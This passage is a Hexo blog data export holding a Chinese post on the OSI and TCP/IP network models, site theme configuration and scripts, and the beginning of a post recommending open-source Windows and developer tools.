互联网层\n\n互联网层相当于OSI模型的网络层，同样是为运输层交给它的数据择路，将数据发送给接收方。主要的协议是IP协议，而IP协议是无连接的数据报服务，也就是说IP协议其实是不可靠的服务，但是IP协议不负责去解决这些问题，而是交给TCP去解决。\n\n#### 网络接口层\n\n网络接口层相当于OSI模型的数据链路层和物理层，主机使用某种协议与具体的网络连接，能够传递IP数据报。\n\n### 讲在后面的话\n\n#### TCP/IP到底几层\n\nTCP/IP是事实标准，分4层。OSI模型是国际标准，分7层。讲课的时候，一般把他们综合起来讲，就说是5层。他把网络接口层分开为数据链路层和物理层了。\n\nOSI的七层协议体系结构的概念清楚，理论也比较完整，但它既复杂又不实用，TCP/IP体系结构则不同，它现在已经得到了非常广泛的应用，TCP/IP是一个四层的体系结构，它包含应用层、运输层、互联网层和网络接口层，不过从实质来讲，TCP/IP只有最上面的三层，因为最下面的网络接口层基本上和一般的通信链路的功能上没有多大差别，对于计算机网络来说，这一层并没有什么特别新的具体的内容，因此在学习计算机网络原理是往往采用折中的办法，即综合OSI和TCP/IP的优点，采用一种只有五层协议的体系结构。","source":"_posts/OSI-TCP-IP-model.md","raw":"---\ntitle: OSI模型与TCP/IP模型\n# password: hello\ndate: 2024-04-10 10:45:28\ncategories: 理论知识\ntags:\n  - 面试\n  - 网络基础\n---\n\n### OSI七层模型\n\nOSI七层模型分别是：应用层、表示层、会话层、 运输层、网络层、数据链路层、物理层。\n\n> 有的将运输层讲为传输层，其实大家表达的意思都一样。\n\n<!-- more -->\n\n#### 应用层\n\n应用层是直接面向用户的，提供UI页面的。\n\n#### 表示层\n\n表示层负责数据的加密与解密，数据的格式转换、数据的压缩与解压。\n\n#### 会话层\n\n会话层负责管理会话。建立连接，维护连接，控制连接的建立与终止。包括何时开始会话，何时交换数据，数据发送方式（轮流发送、同时发送）、会话中断如何恢复、会话如何结束。\n\n#### 运输层\n\n段是运输层的数据传输单位，运输层是在为正在通讯的两台主机的应用进程服务的，并且提供的是可靠的数据传输服务。特别留意运输层是**端到端的通讯方式**，运输层的功能可以概括为“三控制一寻址”：\n\n- 差错控制：检测传输过程中数据的错误，并纠正错误。\n- 流量控制：为了防止发送方将数据过快的发送，而接收方不能及时接收，从而导致数据丢失的现象。\n- 连接控制：为了提供可靠的**端到端**通信，在传输数据时建立连接，在数据传输完毕关闭连接。\n- 应用进程寻址：一台主机上可能会有多个应用进程，运输层要通过某种编址方法，能区分每个应用进程，将数据传输给正确的应用进程。\n\n#### 网络层\n\n网络层的基本传输单位是分组。在数据的发送方和接收方有可能隔着很多不同的网络，而网络层的主要的任务是为分组择路，选择一条合适的路径，使数据能够从发送方到达接收方。特别留意运输层是**点到点的通讯方式**。\n\n#### 数据链路层\n\n数据链路层的基本传输单位是帧。数据链路层是网络层和物理层的桥梁，在同一物理网络中，两个节点（主机与交换机）之间传输帧，数据链路层也涉及到一个寻址的问题，而在数据链路层是通过MAC地址的方式进行寻址的。数据链路层也有流量控制、差错控制、访问控制的功能。\n\n#### 物理层\n\n物理层的基本传输单位是比特。物理层更贴近硬件，比如网线。物理层的主要任务是将0,1比特流从物理链路的一端发送到另一端。\n\n### 图片对比\n\n![图片对比](./OSI-TCP-IP-model/1.png)\n\n### TCP/IP模型\n\nTCP/IP模型是OSI模型之后新提出的模型，一共四层：应用层、运输层、互联网层、网络接口层。\n\n#### 应用层\n\nTCP/IP模型与OSI模型的应用层功能基本一致，囊括应用层的应用协议，如HTTP、FTP、SMTP、POP3等。TCP/IP模型没有包含OSI中的表示层和会话层，在实际的联网实践中证明这两个层对于多数的应用程序没有多大的用处。\n\n#### 运输层\n\nTCP/IP模型的运输层也同样提供的是**端到端**的通讯。在TCP/IP的体系中，运输层提供两个非常重要的协议，分别是TCP和UDP。\n\n- TCP：TCP是面向连接的，TCP协议在传输数据之前，会先建立连接，然后才能传输数据；在传输数据时，会进行差错控制，保证数据的可靠性，同时会进行流量控制，保证数据的传输速度。\n- UDP：UDP是面向无连接的，UDP协议不能保证数据的可靠性，但是UDP协议效率比较高，传输的速度比较快，适合对数据安全性不高对速度高的服务，比如音频和视频。\n\n#### 互联网层\n\n互联网层相当于OSI模型的网络层，同样是为运输层交给它的数据择路，将数据发送给接收方。主要的协议是IP协议，而IP协议是无连接的数据报服务，也就是说IP协议其实是不可靠的服务，但是IP协议不负责去解决这些问题，而是交给TCP去解决。\n\n#### 网络接口层\n\n网络接口层相当于OSI模型的数据链路层和物理层，主机使用某种协议与具体的网络连接，能够传递IP数据报。\n\n### 讲在后面的话\n\n#### TCP/IP到底几层\n\nTCP/IP是事实标准，分4层。OSI模型是国际标准，分7层。讲课的时候，一般把他们综合起来讲，就说是5层。他把网络接口层分开为数据链路层和物理层了。\n\nOSI的七层协议体系结构的概念清楚，理论也比较完整，但它既复杂又不实用，TCP/IP体系结构则不同，它现在已经得到了非常广泛的应用，TCP/IP是一个四层的体系结构，它包含应用层、运输层、互联网层和网络接口层，不过从实质来讲，TCP/IP只有最上面的三层，因为最下面的网络接口层基本上和一般的通信链路的功能上没有多大差别，对于计算机网络来说，这一层并没有什么特别新的具体的内容，因此在学习计算机网络原理是往往采用折中的办法，即综合OSI和TCP/IP的优点，采用一种只有五层协议的体系结构。","slug":"OSI-TCP-IP-model","published":1,"updated":"2024-05-03T03:55:54.737Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5eb00337zj3hbey1pwz","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"OSI七层模型\"><a href=\"#OSI七层模型\" class=\"headerlink\" title=\"OSI七层模型\"></a>OSI七层模型</h3><p>OSI七层模型分别是：应用层、表示层、会话层、 运输层、网络层、数据链路层、物理层。</p>\n<blockquote>\n<p>有的将运输层讲为传输层，其实大家表达的意思都一样。</p>\n</blockquote>\n<span id=\"more\"></span>\n\n<h4 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h4><p>应用层是直接面向用户的，提供UI页面的。</p>\n<h4 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h4><p>表示层负责数据的加密与解密，数据的格式转换、数据的压缩与解压。</p>\n<h4 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h4><p>会话层负责管理会话。建立连接，维护连接，控制连接的建立与终止。包括何时开始会话，何时交换数据，数据发送方式（轮流发送、同时发送）、会话中断如何恢复、会话如何结束。</p>\n<h4 id=\"运输层\"><a href=\"#运输层\" class=\"headerlink\" title=\"运输层\"></a>运输层</h4><p>段是运输层的数据传输单位，运输层是在为正在通讯的两台主机的应用进程服务的，并且提供的是可靠的数据传输服务。特别留意运输层是<strong>端到端的通讯方式</strong>，运输层的功能可以概括为“三控制一寻址”：</p>\n<ul>\n<li>差错控制：检测传输过程中数据的错误，并纠正错误。</li>\n<li>流量控制：为了防止发送方将数据过快的发送，而接收方不能及时接收，从而导致数据丢失的现象。</li>\n<li>连接控制：为了提供可靠的<strong>端到端</strong>通信，在传输数据时建立连接，在数据传输完毕关闭连接。</li>\n<li>应用进程寻址：一台主机上可能会有多个应用进程，运输层要通过某种编址方法，能区分每个应用进程，将数据传输给正确的应用进程。</li>\n</ul>\n<h4 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h4><p>网络层的基本传输单位是分组。在数据的发送方和接收方有可能隔着很多不同的网络，而网络层的主要的任务是为分组择路，选择一条合适的路径，使数据能够从发送方到达接收方。特别留意运输层是<strong>点到点的通讯方式</strong>。</p>\n<h4 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h4><p>数据链路层的基本传输单位是帧。数据链路层是网络层和物理层的桥梁，在同一物理网络中，两个节点（主机与交换机）之间传输帧，数据链路层也涉及到一个寻址的问题，而在数据链路层是通过MAC地址的方式进行寻址的。数据链路层也有流量控制、差错控制、访问控制的功能。</p>\n<h4 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h4><p>物理层的基本传输单位是比特。物理层更贴近硬件，比如网线。物理层的主要任务是将0,1比特流从物理链路的一端发送到另一端。</p>\n<h3 id=\"图片对比\"><a href=\"#图片对比\" class=\"headerlink\" title=\"图片对比\"></a>图片对比</h3><p><img src=\"/2024/04/10/OSI-TCP-IP-model/1.png\" alt=\"图片对比\"></p>\n<h3 id=\"TCP-IP模型\"><a href=\"#TCP-IP模型\" class=\"headerlink\" title=\"TCP&#x2F;IP模型\"></a>TCP&#x2F;IP模型</h3><p>TCP&#x2F;IP模型是OSI模型之后新提出的模型，一共四层：应用层、运输层、互联网层、网络接口层。</p>\n<h4 id=\"应用层-1\"><a href=\"#应用层-1\" class=\"headerlink\" title=\"应用层\"></a>应用层</h4><p>TCP&#x2F;IP模型与OSI模型的应用层功能基本一致，囊括应用层的应用协议，如HTTP、FTP、SMTP、POP3等。TCP&#x2F;IP模型没有包含OSI中的表示层和会话层，在实际的联网实践中证明这两个层对于多数的应用程序没有多大的用处。</p>\n<h4 id=\"运输层-1\"><a href=\"#运输层-1\" class=\"headerlink\" title=\"运输层\"></a>运输层</h4><p>TCP&#x2F;IP模型的运输层也同样提供的是<strong>端到端</strong>的通讯。在TCP&#x2F;IP的体系中，运输层提供两个非常重要的协议，分别是TCP和UDP。</p>\n<ul>\n<li>TCP：TCP是面向连接的，TCP协议在传输数据之前，会先建立连接，然后才能传输数据；在传输数据时，会进行差错控制，保证数据的可靠性，同时会进行流量控制，保证数据的传输速度。</li>\n<li>UDP：UDP是面向无连接的，UDP协议不能保证数据的可靠性，但是UDP协议效率比较高，传输的速度比较快，适合对数据安全性不高对速度高的服务，比如音频和视频。</li>\n</ul>\n<h4 id=\"互联网层\"><a href=\"#互联网层\" class=\"headerlink\" title=\"互联网层\"></a>互联网层</h4><p>互联网层相当于OSI模型的网络层，同样是为运输层交给它的数据择路，将数据发送给接收方。主要的协议是IP协议，而IP协议是无连接的数据报服务，也就是说IP协议其实是不可靠的服务，但是IP协议不负责去解决这些问题，而是交给TCP去解决。</p>\n<h4 id=\"网络接口层\"><a href=\"#网络接口层\" class=\"headerlink\" title=\"网络接口层\"></a>网络接口层</h4><p>网络接口层相当于OSI模型的数据链路层和物理层，主机使用某种协议与具体的网络连接，能够传递IP数据报。</p>\n<h3 id=\"讲在后面的话\"><a href=\"#讲在后面的话\" class=\"headerlink\" title=\"讲在后面的话\"></a>讲在后面的话</h3><h4 id=\"TCP-IP到底几层\"><a href=\"#TCP-IP到底几层\" class=\"headerlink\" title=\"TCP&#x2F;IP到底几层\"></a>TCP&#x2F;IP到底几层</h4><p>TCP&#x2F;IP是事实标准，分4层。OSI模型是国际标准，分7层。讲课的时候，一般把他们综合起来讲，就说是5层。他把网络接口层分开为数据链路层和物理层了。</p>\n<p>OSI的七层协议体系结构的概念清楚，理论也比较完整，但它既复杂又不实用，TCP&#x2F;IP体系结构则不同，它现在已经得到了非常广泛的应用，TCP&#x2F;IP是一个四层的体系结构，它包含应用层、运输层、互联网层和网络接口层，不过从实质来讲，TCP&#x2F;IP只有最上面的三层，因为最下面的网络接口层基本上和一般的通信链路的功能上没有多大差别，对于计算机网络来说，这一层并没有什么特别新的具体的内容，因此在学习计算机网络原理是往往采用折中的办法，即综合OSI和TCP&#x2F;IP的优点，采用一种只有五层协议的体系结构。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"OSI七层模型\"><a href=\"#OSI七层模型\" class=\"headerlink\" title=\"OSI七层模型\"></a>OSI七层模型</h3><p>OSI七层模型分别是：应用层、表示层、会话层、 运输层、网络层、数据链路层、物理层。</p>\n<blockquote>\n<p>有的将运输层讲为传输层，其实大家表达的意思都一样。</p>\n</blockquote>","more":"<h4 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h4><p>应用层是直接面向用户的，提供UI页面的。</p>\n<h4 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h4><p>表示层负责数据的加密与解密，数据的格式转换、数据的压缩与解压。</p>\n<h4 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h4><p>会话层负责管理会话。建立连接，维护连接，控制连接的建立与终止。包括何时开始会话，何时交换数据，数据发送方式（轮流发送、同时发送）、会话中断如何恢复、会话如何结束。</p>\n<h4 id=\"运输层\"><a href=\"#运输层\" class=\"headerlink\" title=\"运输层\"></a>运输层</h4><p>段是运输层的数据传输单位，运输层是在为正在通讯的两台主机的应用进程服务的，并且提供的是可靠的数据传输服务。特别留意运输层是<strong>端到端的通讯方式</strong>，运输层的功能可以概括为“三控制一寻址”：</p>\n<ul>\n<li>差错控制：检测传输过程中数据的错误，并纠正错误。</li>\n<li>流量控制：为了防止发送方将数据过快的发送，而接收方不能及时接收，从而导致数据丢失的现象。</li>\n<li>连接控制：为了提供可靠的<strong>端到端</strong>通信，在传输数据时建立连接，在数据传输完毕关闭连接。</li>\n<li>应用进程寻址：一台主机上可能会有多个应用进程，运输层要通过某种编址方法，能区分每个应用进程，将数据传输给正确的应用进程。</li>\n</ul>\n<h4 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h4><p>网络层的基本传输单位是分组。在数据的发送方和接收方有可能隔着很多不同的网络，而网络层的主要的任务是为分组择路，选择一条合适的路径，使数据能够从发送方到达接收方。特别留意运输层是<strong>点到点的通讯方式</strong>。</p>\n<h4 id=\"数据链路层\"><a href=\"#数据链路层\" class=\"headerlink\" title=\"数据链路层\"></a>数据链路层</h4><p>数据链路层的基本传输单位是帧。数据链路层是网络层和物理层的桥梁，在同一物理网络中，两个节点（主机与交换机）之间传输帧，数据链路层也涉及到一个寻址的问题，而在数据链路层是通过MAC地址的方式进行寻址的。数据链路层也有流量控制、差错控制、访问控制的功能。</p>\n<h4 id=\"物理层\"><a href=\"#物理层\" class=\"headerlink\" title=\"物理层\"></a>物理层</h4><p>物理层的基本传输单位是比特。物理层更贴近硬件，比如网线。物理层的主要任务是将0,1比特流从物理链路的一端发送到另一端。</p>\n<h3 id=\"图片对比\"><a href=\"#图片对比\" class=\"headerlink\" title=\"图片对比\"></a>图片对比</h3><p><img src=\"/2024/04/10/OSI-TCP-IP-model/1.png\" alt=\"图片对比\"></p>\n<h3 id=\"TCP-IP模型\"><a href=\"#TCP-IP模型\" class=\"headerlink\" title=\"TCP&#x2F;IP模型\"></a>TCP&#x2F;IP模型</h3><p>TCP&#x2F;IP模型是OSI模型之后新提出的模型，一共四层：应用层、运输层、互联网层、网络接口层。</p>\n<h4 id=\"应用层-1\"><a href=\"#应用层-1\" class=\"headerlink\" title=\"应用层\"></a>应用层</h4><p>TCP&#x2F;IP模型与OSI模型的应用层功能基本一致，囊括应用层的应用协议，如HTTP、FTP、SMTP、POP3等。TCP&#x2F;IP模型没有包含OSI中的表示层和会话层，在实际的联网实践中证明这两个层对于多数的应用程序没有多大的用处。</p>\n<h4 id=\"运输层-1\"><a href=\"#运输层-1\" class=\"headerlink\" title=\"运输层\"></a>运输层</h4><p>TCP&#x2F;IP模型的运输层也同样提供的是<strong>端到端</strong>的通讯。在TCP&#x2F;IP的体系中，运输层提供两个非常重要的协议，分别是TCP和UDP。</p>\n<ul>\n<li>TCP：TCP是面向连接的，TCP协议在传输数据之前，会先建立连接，然后才能传输数据；在传输数据时，会进行差错控制，保证数据的可靠性，同时会进行流量控制，保证数据的传输速度。</li>\n<li>UDP：UDP是面向无连接的，UDP协议不能保证数据的可靠性，但是UDP协议效率比较高，传输的速度比较快，适合对数据安全性不高对速度高的服务，比如音频和视频。</li>\n</ul>\n<h4 id=\"互联网层\"><a href=\"#互联网层\" class=\"headerlink\" title=\"互联网层\"></a>互联网层</h4><p>互联网层相当于OSI模型的网络层，同样是为运输层交给它的数据择路，将数据发送给接收方。主要的协议是IP协议，而IP协议是无连接的数据报服务，也就是说IP协议其实是不可靠的服务，但是IP协议不负责去解决这些问题，而是交给TCP去解决。</p>\n<h4 id=\"网络接口层\"><a href=\"#网络接口层\" class=\"headerlink\" title=\"网络接口层\"></a>网络接口层</h4><p>网络接口层相当于OSI模型的数据链路层和物理层，主机使用某种协议与具体的网络连接，能够传递IP数据报。</p>\n<h3 id=\"讲在后面的话\"><a href=\"#讲在后面的话\" class=\"headerlink\" title=\"讲在后面的话\"></a>讲在后面的话</h3><h4 id=\"TCP-IP到底几层\"><a href=\"#TCP-IP到底几层\" class=\"headerlink\" title=\"TCP&#x2F;IP到底几层\"></a>TCP&#x2F;IP到底几层</h4><p>TCP&#x2F;IP是事实标准，分4层。OSI模型是国际标准，分7层。讲课的时候，一般把他们综合起来讲，就说是5层。他把网络接口层分开为数据链路层和物理层了。</p>\n<p>OSI的七层协议体系结构的概念清楚，理论也比较完整，但它既复杂又不实用，TCP&#x2F;IP体系结构则不同，它现在已经得到了非常广泛的应用，TCP&#x2F;IP是一个四层的体系结构，它包含应用层、运输层、互联网层和网络接口层，不过从实质来讲，TCP&#x2F;IP只有最上面的三层，因为最下面的网络接口层基本上和一般的通信链路的功能上没有多大差别，对于计算机网络来说，这一层并没有什么特别新的具体的内容，因此在学习计算机网络原理是往往采用折中的办法，即综合OSI和TCP&#x2F;IP的优点，采用一种只有五层协议的体系结构。</p>"},{"title":"超良心的开源精品软件或项目","date":"2023-09-10T14:11:11.000Z","_content":"\n本文旨在收集实用、安全、免费、有趣的开源项目或软件。\n\n<!-- more -->\n\n### Windows调优区\n\n* **[Optimizer](https://github.com/hellzerg/optimizer)**\n\n堪称是Windows 系统上最好用的性能优化器！\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/5.png\">\n</p>\n\n* **[SophiApp](https://github.com/wangshusen/SearchEngine)**\n\n一款强大的 Windows 微调工具。这是一个用于微调 Windows 10 和 Windows 11 配置的调整器。它拥有现代化的操作界面，在保证系统稳定的前提下，提供了超过 130 种的调整选项。\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/6.png\">\n</p>\n\n* **[ExplorerPatcher](https://github.com/valinet/ExplorerPatcher)**\n\n自由切换Windows11 开始菜单样式的工具。这是一款能够让Windows 11 的开始菜单栏(Explorer) 重回Windows 10 样式的扩展工具，除此之外还支持禁用Windows 11 的上下文菜单和命令栏等功能，让你在Windows 上拥有更舒适的工作环境。\n\n* **[memreduct](https://github.com/henrypp/memreduct)**\n\n内存自动优化清理，轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/7.png\" />\n</p>\n\n### Windows实用区\n\n* **[Everything](https://www.voidtools.com/zh-cn/)**\n\n本地文件搜索工具，属于本人装机必备的软件。\n\n<p align=\"center\" style=\"width:40%;\">\n\t<img src=\"./OpenSourceSofts/8.png\" />\n</p>\n\n* **[Geek](https://geekuninstaller.com/)**\n\n高效快速、小巧便携。100% 免费的Windows卸载工具，同时在卸载之后会自动清理注册表缓存，也属于我的装机必备软件。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/9.png\" />\n</p>\n\n* **[potplayer视频播放器](https://potplayer.daum.net/)**\n\n本人一直在用的视频播放器软件，几乎是装机必备的软件，功能很强大，唯一的缺点是只支持Windows系统。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/10.png\" />\n</p>\n\n* **[VLC视频播放器](https://www.videolan.org/vlc/)**\n\nVLC 是一款免费、自由、开源的跨平台多媒体播放器及框架，可播放大多数多媒体文件，以及各类流媒体协议。可在所有平台运行 - Windows, Linux, Mac OS X, Unix, iOS, Android...   \n本人在Ubuntu上就是用的这个。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/1.jpg\" />\n</p>\n\n* **[Captura](https://mathewsachin.github.io/blog/2023/04/09/captura-unmaintained.html)**\n\nCaptura是一款适用于 Windows 的屏幕捕获（屏幕截图、录制）应用程序，可以捕获屏幕、网络摄像头、音频和击键。它不再维护，但源代码仍然存档在 GitHub 上，有 8k+ star 和 1.5k+ fork。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/11.png\" />\n</p>\n\n* **[鼠标自动点击器（简单版）](https://github.com/InJeCTrL/ClickRun)** **[鼠标自动点击器（高级版）](https://github.com/taojy123/KeymouseGo)**\n\n可以帮我们自动完成一些机械性重复的工作！\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.png\" />\n</div>\n\n* **[server](https://github.com/screego/server/releases/tag/v1.10.0)**\n\n多用户的屏幕分享服务。它可以快速启动一个在线共享屏幕的服务，让用户无需安装任何软件，仅使用浏览器就能分享自己的屏幕画面。项目基于网页实时通信(WebRTC) 实现，由 STUN/TURN 协议完成内网穿透和浏览器端对端的连接，既实用又有源码可以学习。\n\n<p align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/12.png\" />\n</p>\n\n* **[Umi-OCR](https://github.com/hiroi-sora/Umi-OCR)**\n\nOCR图片转文字识别软件，完全离线。截屏/批量导入图片，支持多国语言、合并段落、竖排文字。可排除水印区域，提取干净的文本。基于 PaddleOCR 。基于 PaddleOCR 的 OCR 图片转文字识别软件。完全免费、可离线使用的开源软件，支持截屏识别文字、批量导入图片、横/竖排文字，还可以自动忽略水印区域，适用于 Win10、Win11 操作系统。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/13.png\" />\n</div>\n\n* **[Gopeed](https://gopeed.com/zh-CN)**\n\n一款支持全平台的下载器。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.jpg\" />\n</div>\n\n### Windows工作区\n\n* **[视频压缩神器](https://handbrake.fr/)**\n\nHandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。转换几乎任何格式的视频，免费和开源多平台（Windows、Mac 和 Linux）。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.jpg\" />\n</div>\n\n* **[LogicFlow](https://github.com/didi/LogicFlow/)**\n\n是一款流程图编辑框架，提供了一系列 流程图的交互、编辑所必需的功能和简单灵活的节点自定义、插件等拓展机制，方便我们快速在业务系统内满足类流程图的需求。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.gif\" />\n</div>\n\n* **[SpleeterGui](https://github.com/boy1dr/SpleeterGui)**\n\n一款Windows 上的音轨分离工具，它是第三方制作的Spleeter 桌面应用，支持中文在内的多国语言，可以将音乐里的人声和乐器声分离，轻松实现提取音乐中的伴奏。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/14.png\" />\n</div>\n\n### Windows娱乐区\n\n* **[lively](https://github.com/rocksdanister/lively)**\n\nWindows 动态桌面壁纸工具。支持 Windows 用户设置多种动画文件为桌面壁纸的工具，不仅安装简单效果炫酷，而且完全免费。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.jpg\" />\n</div>\n\n* **[jellyfin](https://github.com/jellyfin/jellyfin)**\n\n这是一款非常优秀的本地媒体库管理工具。完全免费、支持中文、安装简单、跨平台、功能强大的媒体库管理系统。它能把原本躺在文件夹里的视频文件，变成包含封面、描述、评分、演员表等信息的“影碟”，让视频整整齐齐、赏心悦目，还支持视频续播、订阅更新、多端可看，让你可以远离广告优雅地追剧。\n\n* **[calibre](https://github.com/kovidgoyal/calibre)**\n\n一款完全免费开源且功能强大的电子书管理工具。它是集下载、格式转化、制作、管理于一体的电子书工具，比如可以将 txt 文本，转化成包含作者信息和书籍封面的 mobi 文件，制作完成后还可以直接发送到 Kindle 设备上。 支持多种电子书格式，包括EPUB、MOBI、PDF等等。Calibre的功能非常强大，可以帮助用户轻松地管理自己的电子书库，包括添加、删除、重命名和搜索等。此外，它还提供了阅读器功能，用户可以在软件内直接阅读电子书，而不需要另外下载阅读器。你还可以可通过插件/扩展实现更多的功能。\n\n### 极客区\n\n* **[hackingtool](https://github.com/Z4nzu/hackingtool)**\n\n黑客工具全家桶。该项目收录了各种黑客工具，包括破解密码、SQL 注入、钓鱼攻击、XSS、DDos 等。堪称黑客军火库的开源项目啊\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/15.png\" />\n</div>\n\n* **[Rocket.Chat](https://github.com/RocketChat/Rocket.Chat)**\n\n一款可自由定制的企业级开源通信平台源码。用它来可以搭建一个功能丰富的通信平台，可自托管做为 Slack 的开源替代品。支持创建频道、团队和讨论等多种不同功能的群聊，消息支持图片、文件、视频和语音，拥有包括 Windows、Linux、macOS、Android 和 iOS 在内的多种客户端。 如果你需要搭建一个安全加密，且具有高度私密性的通信平台，那么这款开源项目就非常适合你了。\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/1.webp\" />\n</div>\n\n* **[vanblog](https://github.com/Mereithhh/vanblog)**\n\n实用的一站式个人博客系统。一款简洁优雅的博客系统，追求极致响应速度和博客体验。快到极致的响应速度，Lighthouse 接近满分。前后台均为响应式，支持 Docker 一键部署。前台为静态页面并支持增量渲染，按需构建更新页面。拒绝花里胡哨的功能，专注于个人博客场景。\n\n[vanblog快速上手](https://vanblog.mereith.com/guide/get-started.html)\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/16.png\" />\n</div>\n\n* **[HWiNFO ](https://www.hwinfo.com/)**\n\n适用于 Windows 和 DOS 的全面硬件分析、监控和报告。坦白说，是一个计算机硬件监测工具，并且可以生成报告保存、最全面的系统审计工具。受到了NASA、AMD、华硕、因特尔、戴尔、技嘉等厂商的一致认可。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/5.jpg\" />\n</div>\n\n* **[crystaldiskmark](https://crystalmark.info/en/software/crystaldiskmark/)**\n\nCrystalDiskMark 